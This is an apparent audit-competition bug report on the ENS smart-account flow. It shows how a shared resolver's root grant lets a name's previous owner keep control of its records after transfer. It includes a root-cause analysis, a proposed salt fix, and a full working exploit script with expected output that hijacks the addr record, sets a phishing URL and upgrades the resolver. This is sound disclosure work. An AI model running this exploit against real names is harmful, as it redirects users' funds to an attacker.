# 89279 w a critical previous owner permanently controls what a transferred ens name resolves to

**Submitted on Aug 18th 2026 at 11:29:03 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89279
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/packages/smart-account>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

Every name registered through the Manager smart account flow is pointed at one `PermissionedResolver` shared by the whole account, and each registration grants the registrant `ROLES.ALL` at that resolver root node.

Those roles sit on the resolver contract, not on the name. Transferring the name moves the registry token but leaves the name pointing at the seller resolver with the seller root roles intact.

The buyer owns the name. The seller owns what it resolves to. The seller can repoint the `addr` record at any time, so wallets paying that name pay the seller. The buyer cannot repair the record and cannot revoke the access, both revert. The seller can also replace the resolver implementation, since it is a UUPS proxy and `ROLE_UPGRADE` is inside `ALL_ROLES`.

One grant covers every name the account registers.

## Root cause

### 1. One resolver per account

`packages/smart-account/src/providers/rhinestone/manifest.ts`

```tsx
export function computeResolverSalt(hca: Address): bigint {
  return BigInt(
    keccak256(
      encodeAbiParameters(
        [
          { name: 'id', type: 'bytes32' },
          { name: 'owner', type: 'address' },
          { name: 'version', type: 'uint256' },
        ],
        [keccak256(stringToHex('OwnedResolver')), hca, 0n],
      ),
    ),
  )
}
```

The `VerifiableFactory` salt comes from the account address alone. No name component, so `computeResolverAddress({ chainId, hca })` returns the same resolver for every name the account registers. On chain: of the accounts that registered more than one name in a 25k block window, 45 of 52 had all their names on one resolver.

### 2. Root scoped grant on that resolver

`packages/smart-account/src/providers/rhinestone/registration-calls.ts`, `buildRevealBatch` points the name at that shared resolver via `register(...)` and then emits:

```tsx
// 6. authorizeNameRoles(hex"00", ROLES.ALL, wallet, true) — every session registration
calls.push({
  to: params.resolver,
  value: 0n,
  data: encodeFunctionData({
    abi: permissionedResolverAuthorizeNameRolesSnippet,
    functionName: 'authorizeNameRoles',
    args: ['0x00', ROLES_ALL, params.wallet, true],
  }),
})
```

`hex"00"` is the DNS encoded empty name, so `NameCoder.namehash(hex"00", 0) == 0`, which is `ROOT_RESOURCE`: every node the resolver serves, not the name being registered.

`PermissionedResolver.authorizeNameRoles` NatSpec: "Use `NameCoder.encode("")` for any name, which is equivalent to `grantRootRoles()`."

`ALL_ROLES` (`0x1111...1111`) includes `ROLE_UPGRADE` (`1 << 124`), and `PermissionedResolver._authorizeUpgrade` is `onlyRootRoles(ROLE_UPGRADE)`.

### 3. The grant outlives the name

`ETHRegistry` regenerates the token id on transfer, which resets roles held on the registry. It does not change the name `resolver` field and does not touch roles held on the resolver contract.

## Fix belongs in `packages/smart-account`

The deployed validator pins the grant byte for byte (`HCAOwnerAndSessionValidator._checkResolverCall`) but does not pin the salt. `_checkResolverDeployment` reads the salt out of the caller own `deployProxy` calldata and only requires the derived address to match the resolver the session is bound to:

```solidity
uint256 salt = _readUint(callData, 4 + 32);
...
if (
    keccak256(callData) != keccak256(expectedCallData) ||
    _resolverAddress(account, salt) != resolver
) {
    revert PolicyRuleFailed();
}
```

A per name salt is accepted by the already deployed validator and confines the grant to one name. No contract change required.

## Impact

Funds sent to a transferred name go to its previous owner, at a time of their choosing. The current owner cannot repair the record or revoke the access, both revert. The grant never expires and is not bounded by any session lifetime. One grant covers every name the account has registered or will register. Through the UUPS upgrade path resolution can answer differently per caller, so reading the record does not reveal the compromise.

Mix the label into the resolver salt so each name gets its own resolver, which confines the pinned root grant to that one name. Accepted by the deployed validator today:

```tsx
export function computeResolverSalt(hca: Address, label: string): bigint {
  return BigInt(
    keccak256(
      encodeAbiParameters(
        [
          { name: 'id', type: 'bytes32' },
          { name: 'owner', type: 'address' },
          { name: 'label', type: 'bytes32' },
          { name: 'version', type: 'uint256' },
        ],
        [keccak256(stringToHex('OwnedResolver')), hca, keccak256(stringToHex(label)), 0n],
      ),
    ),
  )
}
```

Call sites: `computeResolverAddress`, the `deployProxy` salt in `buildRevealBatch`, and the session `resolver` binding in `createSessionActor` and `submitFundingAndCommitActor`. Same change applies to `computeOwnedResolverSalt(eoa, 0n)` in `ensureOwnedPermRes.ts`, which repeats the per account pattern.

## Known issues

Not listed. QA-01 states: "A demonstrated security consequence (e.g., a role combination that grants unintended authority) would be a new finding." This is that demonstration. R2-03 and R2-06 do not apply: the retained authority is held by the owner EOA, survives every session expiry, and is unaffected by session revocation.

## Proof of Concept

Runs on a local Anvil fork. Nothing is broadcast to a public network.

{% stepper %}
{% step %}

## Start a pinned local fork

Any Sepolia archive RPC works as the state source:

```bash
anvil --fork-url <SEPOLIA_ARCHIVE_RPC> --fork-block-number 11514500 --port 8545
```

{% endstep %}

{% step %}

## Install `viem` and run

```bash
npm i viem@2.55.18
node exploit.mjs
```

{% endstep %}

{% step %}

## Create `exploit.mjs`

```jsx
// Previous owner keeps control of a name's resolver records after transferring it.
// Runs against a local Anvil fork only.
import {
  createPublicClient, createWalletClient, getAddress, http,
  keccak256, namehash, parseAbi, stringToHex,
} from 'viem'
import { sepolia } from 'viem/chains'

const FORK = '<http://127.0.0.1:8545>'

// Pinned by packages/smart-account/src/providers/rhinestone/manifest.ts
const ETH_REGISTRY = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2'
const RESOLVER_IMPL = '0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e'
const ROOT_RESOURCE = 0n
const ALL_ROLES = 0x1111111111111111111111111111111111111111111111111111111111111111n

// A name registered through the Manager's HCA flow, and its registrant.
const LABEL  = process.env.POC_LABEL  ?? '54321'
const SELLER = getAddress(process.env.POC_SELLER ?? '0x611593D8e330f69cD0beFf92677afBC7d273D78e')
const BUYER    = getAddress('0x00000000000000000000000000000000000000B0')
const ATTACKER = getAddress('0xdEAdDEaDDeAdDeAdDEAdDEaddeAddEAdDEAd0000')

const registryAbi = parseAbi([
  'struct State { uint8 status; uint64 expiry; address latestOwner; uint256 tokenId; uint256 resource; }',
  'function getState(uint256 anyId) view returns (State state)',
  'function getResolver(string label) view returns (address)',
  'function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes data)',
])
const resolverAbi = parseAbi([
  'function setAddr(bytes32 node, uint256 coinType, bytes value)',
  'function addr(bytes32 node, uint256 coinType) view returns (bytes)',
  'function setText(bytes32 node, string key, string value)',
  'function hasRoles(uint256 resource, uint256 roleBitmap, address account) view returns (bool)',
  'function authorizeNameRoles(bytes toName, uint256 roleBitmap, address account, bool grant) returns (bool)',
  'function upgradeToAndCall(address newImplementation, bytes data) payable',
])

const transport = http(FORK)
const pub = createPublicClient({ chain: sepolia, transport })
const wallet = createWalletClient({ chain: sepolia, transport })

const send = async (from, to, abi, functionName, args) => {
  try {
    const { request } = await pub.simulateContract({ address: to, abi, functionName, args, account: from })
    const hash = await wallet.writeContract(request)
    const { status } = await pub.waitForTransactionReceipt({ hash })
    return status === 'success' ? 'OK' : 'REVERT'
  } catch { return 'REVERT' }
}
const step = (n, result, label, extra = '') => console.log(`  [${n}] ${result.padEnd(6)} ${label}${extra}`)

console.log(`fork: ${FORK}  chainId=${await pub.getChainId()}  block=${await pub.getBlockNumber()}`)

const state = await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getState', args: [BigInt(keccak256(stringToHex(LABEL)))] })
const resolver = await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getResolver', args: [LABEL] })
const node = namehash(`${LABEL}.eth`)

console.log(`\nsetup: ${LABEL}.eth`)
console.log(`  registry owner : ${getAddress(state.latestOwner)}`)
console.log(`  resolver       : ${getAddress(resolver)}`)
if (getAddress(state.latestOwner) !== SELLER) throw new Error(`precondition: ${LABEL}.eth not owned by ${SELLER}`)

const sellerRoot = await pub.readContract({ address: resolver, abi: resolverAbi, functionName: 'hasRoles', args: [ROOT_RESOURCE, ALL_ROLES, SELLER] })
console.log(`  resolver.hasRoles(ROOT_RESOURCE, ALL_ROLES, seller) = ${sellerRoot}`)
if (!sellerRoot) throw new Error('precondition: no root grant')

for (const a of [SELLER, BUYER]) {
  await pub.request({ method: 'anvil_impersonateAccount', params: [a] })
  await pub.request({ method: 'anvil_setBalance', params: [a, '0xde0b6b3a7640000'] })
}

console.log('\nexploit')
step(0, await send(SELLER, ETH_REGISTRY, registryAbi, 'safeTransferFrom', [SELLER, BUYER, state.tokenId, 1n, '0x']),
  'seller transfers the name to the buyer')

const after = await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getState', args: [BigInt(keccak256(stringToHex(LABEL)))] })
step(1, getAddress(after.latestOwner) === BUYER ? 'OK' : 'FAIL', 'buyer is now the registry owner')

const resolverAfter = await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getResolver', args: [LABEL] })
step(2, getAddress(resolverAfter) === getAddress(resolver) ? 'OK' : 'FAIL',
  "name still points at the SELLER's resolver", ` -> ${getAddress(resolverAfter)}`)

step(3, await send(SELLER, resolver, resolverAbi, 'setAddr', [node, 60n, ATTACKER]),
  'SELLER, who no longer owns the name, repoints its addr record')

const hijacked = await pub.readContract({ address: resolver, abi: resolverAbi, functionName: 'addr', args: [node, 60n] })
step(4, getAddress(hijacked) === ATTACKER ? 'OK' : 'FAIL',
  'every wallet resolving the name now sends funds to', ` ${getAddress(hijacked)}`)

step(5, await send(SELLER, resolver, resolverAbi, 'setText', [node, 'url', '<https://phish.example>']),
  'SELLER rewrites the text records too')

step(6, await send(BUYER, resolver, resolverAbi, 'setAddr', [node, 60n, BUYER]),
  'BUYER, the actual owner, tries to repair the record')

step(7, await send(BUYER, resolver, resolverAbi, 'authorizeNameRoles', ['0x00', ALL_ROLES, SELLER, false]),
  "BUYER tries to revoke the seller's access")

step(8, await send(SELLER, resolver, resolverAbi, 'upgradeToAndCall', [RESOLVER_IMPL, '0x']),
  'SELLER replaces the resolver implementation (UUPS)')

const confirmed =
  getAddress(after.latestOwner) === BUYER &&
  getAddress(resolverAfter) === getAddress(resolver) &&
  getAddress(hijacked) === ATTACKER
console.log(`\n${confirmed ? 'CONFIRMED' : 'NOT CONFIRMED'}: the buyer owns the name; the seller controls what it resolves to.`)
process.exit(confirmed ? 0 : 1)
```

{% endstep %}

{% step %}

## Expected output

```
fork: <http://127.0.0.1:8545>  chainId=11155111  block=11514500

setup: 54321.eth
  registry owner : 0x611593D8e330f69cD0beFf92677afBC7d273D78e
  resolver       : 0x1D27068A73eae683324792CAd1E9724b1c04Da04
  resolver.hasRoles(ROOT_RESOURCE, ALL_ROLES, seller) = true

exploit
  [0] OK     seller transfers the name to the buyer
  [1] OK     buyer is now the registry owner
  [2] OK     name still points at the SELLER's resolver -> 0x1D27068A73eae683324792CAd1E9724b1c04Da04
  [3] OK     SELLER, who no longer owns the name, repoints its addr record
  [4] OK     every wallet resolving the name now sends funds to 0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000
  [5] OK     SELLER rewrites the text records too
  [6] REVERT BUYER, the actual owner, tries to repair the record
  [7] REVERT BUYER tries to revoke the seller's access
  [8] OK     SELLER replaces the resolver implementation (UUPS)

CONFIRMED: the buyer owns the name; the seller controls what it resolves to.
```

{% endstep %}
{% endstepper %}

The script exits non zero unless the buyer ends up owning the name, the resolver survived the transfer, and the `addr` record ends up under the attacker address. `POC_LABEL` and `POC_SELLER` retarget it at any other name registered through the app.

An offline unit test proving both root causes straight from the batch this package builds, no network, is at `packages/smart-account/src/providers/rhinestone/shared-resolver-root-grant.poc.test.ts` (`pnpm --filter @ens-apps/smart-account test`).
